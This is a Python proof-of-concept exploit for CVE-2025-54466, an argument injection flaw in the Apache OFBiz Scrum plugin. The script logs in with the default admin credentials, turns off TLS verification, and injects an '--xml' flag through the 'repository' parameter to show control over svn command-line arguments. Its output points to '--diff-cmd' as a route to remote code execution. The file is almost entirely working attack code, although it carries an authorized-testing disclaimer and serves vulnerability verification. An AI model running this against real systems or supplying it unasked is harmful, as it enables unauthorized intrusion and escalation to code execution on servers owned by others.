#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache OFBiz Scrum Plugin — SVN Argument Injection Proof (--xml)
# CVE            : CVE-2025-54466
# Vendor         : Apache Software Foundation
# Product        : Apache OFBiz (Scrum Plugin)
# Affected       : All versions before 24.09.02
# Type           : CWE-94 - Code Injection
# CVSS           : 9.8 (Critical)
# Platform       : Java / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-54466 Vector 3 — Non-destructive argument injection proof.

Injects '--xml' into the 'repository' parameter, changing SVN's output
format from plain text to XML. The presence of XML tags in the HTTP
response proves the attacker controls SVN command-line flags.

    Normal:   svn log -r2 /home/ofbiz/svnwc → plain text
    Injected: svn log -r2 --xml /home/ofbiz/svnwc → XML output

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-54466
    - https://github.com/advisories/GHSA-7vg9-49f9-pfxr

Usage:
    python3 poc_vector3.py localhost 8443
"""

import sys
import ssl
import html
import re
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import argparse

DEFAULT_PORT = 8443
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "ofbiz"
SVN_WC_PATH = "/home/ofbiz/svnwc"


def create_https_context():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def build_opener():
    cookie_jar = http.cookiejar.CookieJar()
    cookie_handler = urllib.request.HTTPCookieProcessor(cookie_jar)
    https_handler = urllib.request.HTTPSHandler(context=create_https_context())
    opener = urllib.request.build_opener(cookie_handler, https_handler)
    return opener, cookie_jar


def authenticate(opener, base_url, username, password):
    login_url = f"{base_url}/scrum/control/login"
    data = urllib.parse.urlencode({
        "USERNAME": username,
        "PASSWORD": password,
    }).encode("utf-8")

    print(f"[*] Authenticating as '{username}'...")
    try:
        resp = opener.open(login_url, data, timeout=30)
        resp.read()
        print(f"[+] Authentication successful")
        return True
    except urllib.error.URLError as e:
        print(f"[-] Connection failed: {e}")
        return False


def exploit(target_host, target_port,
            username=DEFAULT_USERNAME, password=DEFAULT_PASSWORD):
    """
    Prove SVN argument injection by injecting --xml.

    This causes 'svn log -r2 --xml /home/ofbiz/svnwc' to execute,
    which changes the output format to XML. The presence of XML tags
    in the HTTP response definitively proves argument injection.

    Requires an existing SVN working copy at SVN_WC_PATH.
    """
    base_url = f"https://{target_host}:{target_port}"

    print("=" * 70)
    print("CVE-2025-54466 Vector 3: SVN Argument Injection Proof (--xml)")
    print("=" * 70)
    print(f"[*] Target: {base_url}")
    print(f"[*] Injection: repository=--xml {SVN_WC_PATH}")
    print()

    opener, _ = build_opener()

    if not authenticate(opener, base_url, username, password):
        return False
    print()

    # ── Step 1: Get NORMAL output (baseline) ──
    print("[*] Step 1: Fetching normal (non-injected) log output as baseline...")
    normal_params = urllib.parse.urlencode({
        "revision": "2",
        "repository": SVN_WC_PATH,
    })
    normal_url = f"{base_url}/scrum/control/RevisionInfo?{normal_params}"

    try:
        resp = opener.open(normal_url, timeout=30)
        normal_body = resp.read().decode("utf-8", errors="replace")
    except (urllib.error.HTTPError, urllib.error.URLError) as e:
        if hasattr(e, 'read'):
            normal_body = e.read().decode("utf-8", errors="replace")
        else:
            normal_body = ""

    pre_pattern = re.compile(r'<pre[^>]*>(.*?)</pre>', re.DOTALL)
    normal_matches = pre_pattern.findall(normal_body)
    normal_log = html.unescape(normal_matches[0]).strip() if normal_matches else "(empty)"
    print(f"[*] Normal logMessage output: {normal_log[:200]}")
    print()

    # ── Step 2: Inject --xml to change output format ──
    print("[*] Step 2: Injecting --xml flag to change svn output format...")

    # Inject --xml as an additional argument via the repository parameter
    payload = f"--xml {SVN_WC_PATH}"
    params = urllib.parse.urlencode({
        "revision": "2",
        "repository": payload,
    })

    exploit_url = f"{base_url}/scrum/control/RevisionInfo?{params}"

    print(f"[*] Payload: repository=--xml {SVN_WC_PATH}")
    print(f"[*] Resulting command: svn log -r2 --xml {SVN_WC_PATH}")
    print(f"[*] Expected: XML-formatted output instead of plain text")

    try:
        resp = opener.open(exploit_url, timeout=30)
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        print(f"[-] Request failed: {e}")
        return False

    # Extract pre tag contents
    matches = pre_pattern.findall(body)
    log_output = html.unescape(matches[0]).strip() if len(matches) >= 1 else ""
    diff_output = html.unescape(matches[1]).strip() if len(matches) >= 2 else ""

    print()
    print("=" * 70)

    # Check for XML indicators in the output
    xml_indicators = ['<?xml', '<log>', '<logentry', '</log>', '<author>', '<date>', '<msg>']
    found_xml = any(indicator in log_output for indicator in xml_indicators)

    if found_xml:
        print("[+] ✅ ARGUMENT INJECTION CONFIRMED — XML output detected:")
        print("=" * 70)
        print()
        print(f"Normal output format (plain text):")
        print(f"  {normal_log[:150]}")
        print()
        print(f"Injected output format (XML):")
        print(f"  {log_output[:500]}")
        print()
        print("=" * 70)
        print("[+] Proof: The '--xml' flag was injected into the svn command")
        print("[+]   Normal: svn log -r2 /home/ofbiz/svnwc → plain text")
        print("[+]   Injected: svn log -r2 --xml /home/ofbiz/svnwc → XML output")
        print("[+] Impact: Attacker controls svn command-line flags")
        print("[+] Escalation: Use --diff-cmd=<binary> for RCE (see poc.py)")
        return True
    else:
        # Check if the output changed at all compared to baseline
        if log_output != normal_log and log_output:
            print("[*] Output differs from baseline, possible injection:")
            print(f"[*] Injected log output: {log_output[:300]}")
        elif not log_output:
            print("[*] Empty log output — svn may have encountered an error")
        else:
            print("[-] Output appears unchanged — injection may not have worked")

        if diff_output:
            found_xml_diff = any(indicator in diff_output for indicator in xml_indicators)
            if found_xml_diff:
                print("[+] ✅ XML detected in diff output instead:")
                print(diff_output[:300])
                return True

        print("[-] ARGUMENT INJECTION: Could not confirm via --xml flag")
        print("=" * 70)
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-54466 Vector 3: SVN Argument Injection Proof (--xml)"
    )
    parser.add_argument("host", nargs="?", default="localhost")
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("-u", "--username", default=DEFAULT_USERNAME)
    parser.add_argument("-p", "--password", default=DEFAULT_PASSWORD)

    args = parser.parse_args()
    success = exploit(args.host, args.port, args.username, args.password)
    sys.exit(0 if success else 1)
